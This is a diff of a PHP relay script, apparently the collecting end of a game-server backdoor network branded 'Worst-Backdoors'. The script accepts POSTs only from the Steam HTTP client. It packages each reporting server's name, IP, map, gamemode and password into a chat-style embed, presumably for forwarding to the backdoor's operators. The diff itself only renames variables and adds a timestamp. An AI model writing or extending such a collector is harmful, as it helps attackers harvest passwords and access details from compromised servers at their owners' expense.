@@ -1,11 +1,12 @@
 <?php
 // Relay Information
-$server_name = $_POST['server_name'];
-$server_ip = $_POST['server_ip'];
-$server_map = $_POST['server_map'];
-$server_gamemode = $_POST['server_gamemode'];
-$server_pw = $_POST['server_pw'];
-if(!$server_pw) { $server_pw = "nil"; }
+$date = date("Y:m:d H:i:s"); // request date
+$server = $_POST['server_name'];
+$serverip = $_POST['server_ip'];
+$map = $_POST['server_map'];
+$gamemode = $_POST['server_gamemode'];
+$password = $_POST['server_pw'];
+if(!$password) { $password = "nil"; }
 
 if($_SERVER['HTTP_USER_AGENT'] == "Valve/Steam HTTP Client 1.0 (4000)") {
     $json_data = json_encode([
@@ -14,7 +15,7 @@ if($_SERVER['HTTP_USER_AGENT'] == "Valve/Steam HTTP Client 1.0 (4000)") {
                 "title" => "",
                 "color" => hexdec("#86ffba"),
                 "timestamp" => date("c", strtotime("now")),
-                "description" => "```Server: $server_name\nServerIp: $server_ip\nMap: $server_map\nPassword: $server_pw\nGamemode: $server_gamemode\n```",
+                "description" => "```Server: $server\nServerIp: $serverip\nMap: $map\nPassword: $password\nGamemode: $gamemode\n```",
                 "footer" => [
                     "text" => "Worst-Backdoors",
                 ]
